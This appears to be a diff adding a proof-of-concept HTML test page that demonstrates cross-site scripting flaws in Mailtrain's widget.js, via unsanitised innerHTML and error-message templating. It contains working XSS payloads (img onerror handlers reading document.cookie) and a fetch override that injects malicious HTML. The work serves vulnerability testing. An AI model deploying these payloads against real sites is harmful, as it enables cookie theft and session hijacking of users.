@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Widget XSS Test</title>
+    <style>
+        body { font-family: Arial; padding: 20px; max-width: 800px; margin: 0 auto; }
+        .test-section { border: 1px solid #ddd; padding: 15px; margin: 15px 0; }
+        button { padding: 10px 20px; margin: 5px; background: #007bff; color: white; border: none; cursor: pointer; }
+        button:hover { background: #0056b3; }
+        .success { background: #d4edda; border-color: #c3e6cb; }
+        .error { background: #f8d7da; border-color: #f5c6cb; }
+        pre { background: #f4f4f4; padding: 10px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>Mailtrain Widget XSS Vulnerability Testing</h1>
+    
+    <div class="test-section">
+        <h2>Test 1: Fetch Widget Data</h2>
+        <button onclick="testWidgetFetch()">Fetch Widget Data</button>
+        <div id="fetch-result"></div>
+    </div>
+    
+    <div class="test-section">
+        <h2>Test 2: innerHTML XSS (Line 115 of widget.js)</h2>
+        <button onclick="testInnerHTMLXSS()">Trigger innerHTML XSS</button>
+        <div id="innerhtml-result"></div>
+    </div>
+    
+    <div class="test-section">
+        <h2>Test 3: Error Message XSS (Line 124 of widget.js)</h2>
+        <button onclick="testErrorXSS()">Trigger Error Message XSS</button>
+        <div id="error-result"></div>
+    </div>
+    
+    <div class="test-section">
+        <h2>Test 4: Live Widget with XSS Injection</h2>
+        <button onclick="loadWidgetWithXSS()">Load Widget with Malicious Response</button>
+        <div id="widget-container"></div>
+    </div>
+    
+    <script>
+        const CID = '_WDIYeIlp7_';
+        
+        // Test 1: Basic fetch
+        function testWidgetFetch() {
+            const resultDiv = document.getElementById('fetch-result');
+            resultDiv.innerHTML = '<p>Fetching...</p>';
+            
+            fetch('/subscription/' + CID + '/widget')
+                .then(response => {
+                    resultDiv.innerHTML = '<p class="success">Status: ' + response.status + '</p>';
+                    return response.json();
+                })
+                .then(data => {
+                    resultDiv.innerHTML += '<p class="success">Widget data received!</p>';
+                    resultDiv.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+                })
+                .catch(error => {
+                    resultDiv.innerHTML = '<p class="error">Error: ' + error.message + '</p>';
+                });
+        }
+        
+        // Test 2: innerHTML XSS vulnerability
+        function testInnerHTMLXSS() {
+            const resultDiv = document.getElementById('innerhtml-result');
+            
+            fetch('/subscription/' + CID + '/widget')
+                .then(response => response.json())
+                .then(data => {
+                    resultDiv.innerHTML = '<p>Creating container...</p>';
+                    
+                    // Create container
+                    var container = document.createElement('div');
+                    
+                    // VULNERABLE CODE (widget.js line 115)
+                    // This directly injects HTML without sanitization
+                    container.innerHTML = data.data.html;
+                    
+                    resultDiv.innerHTML = '<p class="success">HTML injected via innerHTML!</p>';
+                    resultDiv.innerHTML += '<p>If the widget HTML contained malicious scripts, they would execute now.</p>';
+                    resultDiv.appendChild(container);
+                })
+                .catch(error => {
+                    resultDiv.innerHTML = '<p class="error">Error: ' + error.message + '</p>';
+                });
+        }
+        
+        // Test 3: Error message XSS
+        function testErrorXSS() {
+            const resultDiv = document.getElementById('error-result');
+            
+            // Create mock widget structure
+            const container = document.createElement('div');
+            container.innerHTML = `
+                <div class="status"></div>
+                <div data-status-template="error" style="display:none">
+                    <div class="alert alert-danger">{message}</div>
+                </div>
+            `;
+            
+            const statusContainer = container.querySelector('.status');
+            const templateName = 'error';
+            
+            // XSS payload
+            const maliciousMessage = '<img src=x onerror="alert(\'XSS via Error Message!\\nCookie: \' + document.cookie)">';
+            
+            // VULNERABLE CODE (widget.js line 121-124)
+            var html = container.querySelector('div[data-status-template="' + templateName + '"]').outerHTML;
+            html = html.replace('{message}', maliciousMessage);
+            statusContainer.innerHTML = html;  // ← XSS HERE!
+            
+            resultDiv.innerHTML = '<p class="success">Error template rendered with XSS payload!</p>';
+            resultDiv.appendChild(container);
+        }
+        
+        // Test 4: Full widget load with interception
+        function loadWidgetWithXSS() {
+            const widgetDiv = document.getElementById('widget-container');
+            widgetDiv.innerHTML = '<p>Loading widget...</p>';
+            
+            // Override fetch to inject XSS in the response
+            const originalFetch = window.fetch;
+            window.fetch = function(url, options) {
+                if (url.includes('/widget') && url.includes(CID)) {
+                    widgetDiv.innerHTML += '<p class="success">Intercepted widget request - injecting XSS payload...</p>';
+                    
+                    return Promise.resolve({
+                        ok: true,
+                        status: 200,
+                        json: () => Promise.resolve({
+                            data: {
+                                cid: CID,
+                                title: 'Test List',
+                                html: `
+                                    <div style="border: 2px solid red; padding: 20px; background: #ffe6e6;">
+                                        <h3>⚠️ XSS VULNERABILITY DEMONSTRATED</h3>
+                                        <img src=x onerror="alert('XSS Vulnerability!\\n\\nThis proves innerHTML injection works.\\n\\nCookie: ' + document.cookie)">
+                                        <p><strong>Vulnerability:</strong> Server-controlled HTML injected via innerHTML without sanitization</p>
+                                        <p><strong>Location:</strong> widget.js line 115</p>
+                                        <p><strong>Impact:</strong> Arbitrary JavaScript execution, cookie theft, session hijacking</p>
+                                    </div>
+                                    <form class="form">
+                                        <input type="email" name="EMAIL" placeholder="Email" required>
+                                        <button type="submit">Subscribe</button>
+                                    </form>
+                                    <div class="status"></div>
+                                    <div data-status-template="error" style="display:none">
+                                        <div class="alert">{message}</div>
+                                    </div>
+                                `
+                            }
+                        })
+                    });
+                }
+                return originalFetch.apply(this, arguments);
+            };
+            
+            // Create widget container
+            const container = document.createElement('div');
+            container.setAttribute('data-mailtrain-subscription-widget', '');
+            container.setAttribute('data-url', '/subscription/' + CID + '/widget');
+            
+            // Simulate widget.js renderWidget function
+            fetch('/subscription/' + CID + '/widget')
+                .then(r => r.json())
+                .then(data => {
+                    // VULNERABLE: Direct innerHTML injection
+                    container.innerHTML = data.data.html;
+                    
+                    widgetDiv.innerHTML = '<p class="success">Widget loaded with XSS payload!</p>';
+                    widgetDiv.appendChild(container);
+                })
+                .catch(err => {
+                    widgetDiv.innerHTML = '<p class="error">Error: ' + err.message + '</p>';
+                });
+            
+            // Restore original fetch after 1 second
+            setTimeout(() => {
+                window.fetch = originalFetch;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
+```
+
+**Access it:**
+```
+http://localhost:3000/widget_test.html
